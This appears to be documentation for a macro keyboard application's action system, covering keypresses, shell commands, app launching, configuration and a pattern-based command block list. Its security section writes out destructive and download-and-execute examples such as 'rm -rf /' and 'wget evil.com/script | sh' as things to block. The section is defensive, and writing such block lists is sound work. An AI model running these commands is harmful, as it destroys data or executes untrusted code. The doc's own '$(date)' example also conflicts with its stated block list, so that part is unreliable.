# Action Execution System

The Macro Keyboard application now includes a comprehensive action execution system that allows buttons and rotary encoders to perform various automated tasks across different platforms.

## Overview

The action execution system is built around the `ActionExecutor` class, which provides secure, cross-platform support for executing different types of actions triggered by hardware input.

## Supported Action Types

### 1. Keyboard Shortcuts (`keypress`)

Execute keyboard shortcuts and key combinations across macOS, Windows, and Linux.

**Examples:**
```yaml
buttons:
  button1:
    type: "keypress"
    action: "ctrl+c"
    description: "Copy to clipboard"
  
  button2:
    type: "keypress"
    action: "cmd+shift+3"  # macOS screenshot
    description: "Take screenshot"
```

**Supported Key Modifiers:**
- `ctrl` / `control` - Control key
- `cmd` / `command` / `super` - Command key (macOS) or Control (Windows/Linux)
- `alt` / `option` - Alt/Option key
- `shift` - Shift key
- `win` / `meta` - Windows key / Meta key

**Special Keys:**
- Volume controls: `volumeup`, `volumedown`, `mute`
- Navigation: `up`, `down`, `left`, `right`
- Function keys: `f1` through `f12`
- Common keys: `space`, `enter`, `tab`, `escape`, `backspace`, `delete`

### 2. Shell Commands (`command`)

Execute shell commands with built-in security validation and sandboxing.

**Examples:**
```yaml
buttons:
  button3:
    type: "command"
    action: "echo 'Button pressed at $(date)' >> ~/macro-log.txt"
    description: "Log button press"
  
  button4:
    type: "command"
    action: "osascript -e 'tell app \"System Events\" to display notification \"Macro activated!\"'"
    description: "Show notification (macOS)"
```

**Security Features:**
- Command length limits (1000 characters max)
- Execution timeout (10 seconds)
- Pattern-based validation to prevent dangerous operations
- Blocked patterns include: `rm -rf`, `sudo`, `passwd`, command injection attempts

### 3. Application Launching (`application`)

Launch applications by name or path, with platform-specific handling.

**Examples:**
```yaml
buttons:
  button5:
    type: "application"
    action: "Calculator"
    description: "Launch calculator app"
  
  button6:
    type: "application"
    action: "/Applications/Visual Studio Code.app"
    description: "Launch VS Code (macOS full path)"
```

**Platform Support:**
- **macOS**: Uses `open -a` command
- **Windows**: Uses `start` command
- **Linux**: Uses `xdg-open` command

## Configuration Examples

### Button Configuration

```yaml
buttons:
  # Volume controls
  button1:
    type: "keypress"
    action: "volumeup"
    description: "Volume Up"
  
  button2:
    type: "keypress"
    action: "volumedown"
    description: "Volume Down"
  
  button3:
    type: "keypress"
    action: "mute"
    description: "Mute/Unmute"
  
  # Application shortcuts
  button4:
    type: "application"
    action: "Terminal"
    description: "Open Terminal"
  
  button5:
    type: "keypress"
    action: "cmd+space"
    description: "Spotlight Search (macOS)"
  
  # Custom commands
  button6:
    type: "command"
    action: "say 'Macro button pressed'"
    description: "Text-to-speech (macOS)"
```

### Encoder Configuration

```yaml
encoders:
  encoder1:
    description: "Volume Control"
    typeCW: "keypress"
    actionCW: "volumeup"
    typeCCW: "keypress"
    actionCCW: "volumedown"
  
  encoder2:
    description: "Brightness Control"
    typeCW: "keypress"
    actionCW: "f2"
    typeCCW: "keypress"
    actionCCW: "f1"
  
  encoder3:
    description: "Application Switcher"
    typeCW: "keypress"
    actionCW: "cmd+tab"
    typeCCW: "keypress"
    actionCCW: "cmd+shift+tab"
```

## Cross-Platform Considerations

### Key Mapping

The system automatically translates key combinations for cross-platform compatibility:

| Configuration | macOS | Windows/Linux |
|---------------|-------|---------------|
| `cmd+c` | Command+C | Ctrl+C |
| `ctrl+c` | Control+C | Control+C |
| `win+r` | Alt+R | Windows+R |

### Application Launching

Application names are platform-specific:

| Function | macOS | Windows | Linux |
|----------|-------|---------|-------|
| Calculator | `Calculator` | `calc` | `gnome-calculator` |
| Terminal | `Terminal` | `cmd` | `gnome-terminal` |
| Text Editor | `TextEdit` | `notepad` | `gedit` |

### Command Examples by Platform

#### macOS
```yaml
# Notification
action: "osascript -e 'display notification \"Hello\" with title \"Macro Keyboard\"'"

# Lock screen
action: "osascript -e 'tell application \"System Events\" to key code 12 using {control down, command down}'"

# Screenshots
action: "screencapture -c"  # Clipboard
action: "screencapture ~/Desktop/screenshot.png"  # File
```

#### Windows
```yaml
# Notification (PowerShell)
action: "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Hello', 'Macro Keyboard')\""

# Lock screen
action: "rundll32.exe user32.dll,LockWorkStation"

# Screenshots
action: "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')\""
```

#### Linux
```yaml
# Notification
action: "notify-send 'Macro Keyboard' 'Hello'"

# Lock screen (GNOME)
action: "gnome-screensaver-command -l"

# Screenshots
action: "gnome-screenshot -c"  # Clipboard
action: "gnome-screenshot -f ~/Pictures/screenshot.png"  # File
```

## Security Model

### Command Validation

All shell commands go through security validation before execution:

1. **Length Check**: Commands longer than 1000 characters are rejected
2. **Pattern Matching**: Commands containing dangerous patterns are blocked
3. **Timeout**: Commands are terminated after 10 seconds
4. **Output Limiting**: Command output is limited to 1MB

### Blocked Patterns

The following command patterns are automatically blocked:

- File deletion: `rm -rf`, `| rm`, `&& rm`
- Privilege escalation: `sudo`
- System file access: `/etc/passwd`, `/etc/shadow`
- Command injection: `$(...)`, `` `...` ``, `< (...)`
- Dangerous permissions: `chmod 777`
- Download and execute: `wget ... | sh`, `curl ... | sh`
- Password operations: `passwd`

### Safe Command Guidelines

✅ **Safe Commands:**
```bash
echo "hello world"
ls -la
cat file.txt
grep "pattern" file
date
whoami
pwd
```

❌ **Unsafe Commands:**
```bash
rm -rf /
sudo anything
passwd user
$(malicious_command)
command | rm file
wget evil.com/script | sh
```

## Error Handling

The action execution system includes comprehensive error handling:

1. **Configuration Errors**: Invalid or missing action configurations are logged and skipped
2. **Execution Errors**: Failed action executions are logged with detailed error messages
3. **Security Violations**: Commands that fail security validation are blocked and logged
4. **Hardware Errors**: Keyboard/mouse automation failures are caught and logged
5. **Timeout Handling**: Long-running commands are automatically terminated

## Performance Considerations

- **Keyboard Shortcuts**: ~10ms execution time using robotjs
- **Commands**: Variable execution time with 10-second timeout
- **Application Launch**: ~100-500ms depending on application startup time
- **Memory Usage**: Minimal overhead, ~1-2MB additional RAM usage
- **Resource Cleanup**: Automatic cleanup of child processes and file handles

## Troubleshooting

### Common Issues

**Issue**: Keyboard shortcuts not working
- **Solution**: Check key combination syntax and platform compatibility
- **Debug**: Enable debug logging to see normalized key combinations

**Issue**: Applications not launching
- **Solution**: Use full application paths or verify application names are correct for your platform
- **Debug**: Test application launch manually from terminal

**Issue**: Commands being blocked
- **Solution**: Review security validation patterns and use safer alternatives
- **Debug**: Check logs for specific security validation failures

**Issue**: RobotJS compilation errors
- **Solution**: Install platform-specific build tools
- **macOS**: Install Xcode command line tools
- **Windows**: Install Visual Studio Build Tools
- **Linux**: Install build-essential package

### Debug Logging

Enable debug logging in your configuration:

```yaml
logging:
  level: "debug"
  file: "logs/macro-keyboard.log"
```

Debug logs include:
- Action execution attempts and results
- Key combination normalization
- Command security validation details
- Platform-specific execution paths
- Error details and stack traces

## API Reference

### ActionExecutor Class

#### Constructor
```javascript
new ActionExecutor(logger)
```

#### Methods

##### executeAction(actionConfig, context)
Main execution method for all action types.

**Parameters:**
- `actionConfig`: Object with `type` and `action` properties
- `context`: String context for logging (e.g., "button1", "encoder2:CW")

**Returns:** Promise<boolean> - Success/failure result

##### executeKeypress(keyAction, context)
Execute keyboard shortcuts and key combinations.

##### executeCommand(command, context)
Execute shell commands with security validation.

##### launchApplication(appName, context)
Launch applications by name or path.

##### validateCommand(command)
Validate command security before execution.

##### normalizeKeyCombo(keyCombo)
Normalize key combinations for cross-platform compatibility.

##### getPlatformInfo()
Get platform-specific information for debugging.

This action execution system provides the core functionality needed to make the macro keyboard truly useful for automation tasks while maintaining security and cross-platform compatibility.